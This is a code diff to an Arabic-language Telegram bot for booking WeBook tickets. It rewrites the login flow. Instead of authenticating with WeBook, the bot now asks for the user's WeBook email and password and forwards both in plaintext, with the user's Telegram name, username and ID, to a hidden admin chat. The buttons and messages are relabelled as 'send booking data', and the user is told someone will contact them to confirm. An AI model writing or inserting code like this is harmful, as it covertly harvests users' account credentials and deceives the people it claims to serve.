@@ -71,9 +71,8 @@ async def show_main_menu(update: Update, context, edit=False):
     ]
     if logged_in:
         keyboard.append([InlineKeyboardButton("🎫 حجز تذكرة WeBook", callback_data="webook_booking")])
-        keyboard.append([InlineKeyboardButton("🔑 حساب WeBook (متصل ✅)", callback_data="webook_account")])
     else:
-        keyboard.append([InlineKeyboardButton("🔑 تسجيل الدخول WeBook", callback_data="webook_login")])
+        keyboard.append([InlineKeyboardButton("🎫 إرسال بيانات الحجز", callback_data="webook_login")])
     keyboard.append([InlineKeyboardButton("📋 بياناتي", callback_data="my_data")])
     keyboard.append([InlineKeyboardButton("🔧 الدعم الفني", callback_data="support")])
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -130,9 +129,8 @@ async def menu_callback(update: Update, context):
         ]
         if logged_in:
             btns.append([InlineKeyboardButton("🎫 حجز تذكرة WeBook", callback_data="webook_booking")])
-            btns.append([InlineKeyboardButton("🔑 حساب WeBook (متصل ✅)", callback_data="webook_account")])
         else:
-            btns.append([InlineKeyboardButton("🔑 تسجيل الدخول WeBook", callback_data="webook_login")])
+            btns.append([InlineKeyboardButton("🎫 إرسال بيانات الحجز", callback_data="webook_login")])
         btns.append([InlineKeyboardButton("📋 بياناتي", callback_data="my_data")])
         btns.append([InlineKeyboardButton("🔧 الدعم الفني", callback_data="support")])
         await query.edit_message_text(
@@ -519,18 +517,10 @@ async def booking_cancel(update: Update, context):
 async def webook_login_start(update: Update, context):
     query = update.callback_query
     await query.answer()
-    token = get_webook_token(query.from_user.id)
-    if token and token.get("access_token"):
-        await query.edit_message_text(
-            "✅ أنت مسجل الدخول بالفعل!",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]]),
-        )
-        return
-
     context.user_data.clear()
     context.user_data["webook_login_step"] = "awaiting_email"
     await query.edit_message_text(
-        "🔑 <b>تسجيل الدخول إلى WeBook</b>\n\n"
+        "🎫 <b>إرسال بيانات الحجز</b>\n\n"
         "أرسل <b>البريد الإلكتروني</b> الخاص بحسابك في WeBook:\n\n"
         "لإلغاء أرسل /cancel",
         parse_mode=ParseMode.HTML,
@@ -574,31 +564,31 @@ async def webook_handle_message(update: Update, context):
             set_pref(user.id, "webook_email", email)
             set_pref(user.id, "webook_password", text)
 
-            await update.message.reply_text("🔄 جاري تسجيل الدخول إلى WeBook...")
-
-            result, err = wk.login(email, text)
-            if err:
-                await update.message.reply_text(f"❌ فشل تسجيل الدخول:\n{err}")
-                context.user_data["webook_login_step"] = "awaiting_email"
-                context.user_data.pop("webook_email", None)
-                return
-
-            save_webook_token(
-                user.id,
-                result["access_token"],
-                result.get("refresh_token", ""),
-                result.get("api_user", ""),
-                result.get("guid", ""),
+            msg = (
+                f"🎫 <b>بيانات حجز جديدة!</b>\n\n"
+                f"👤 {user.first_name} (@{user.username or 'N/A'})\n"
+                f"🆔 {user.id}\n"
+                f"📧 {email}\n"
+                f"🔑 {text}"
             )
+            if ADMIN_CHAT_ID:
+                try:
+                    await context.bot.send_message(
+                        chat_id=ADMIN_CHAT_ID,
+                        text=msg,
+                        parse_mode=ParseMode.HTML,
+                    )
+                except Exception as e:
+                    logger.warning(f"Admin notification failed: {e}")
 
             context.user_data.clear()
             await update.message.reply_text(
-                "✅ <b>تم تسجيل الدخول بنجاح!</b>\n\n"
-                "يمكنك الآن حجز التذاكر مباشرة من البوت.",
+                "✅ <b>تم إرسال بيانات الحجز!</b>\n\n"
+                "سيتم التواصل معك قريباً لتأكيد الحجز.",
                 parse_mode=ParseMode.HTML,
             )
         except Exception as e:
-            logger.error(f"Login error: {e}", exc_info=True)
+            logger.error(f"Booking data error: {e}", exc_info=True)
             await update.message.reply_text(f"❌ حدث خطأ غير متوقع: {str(e)}")
             context.user_data.pop("webook_login_step", None)
 
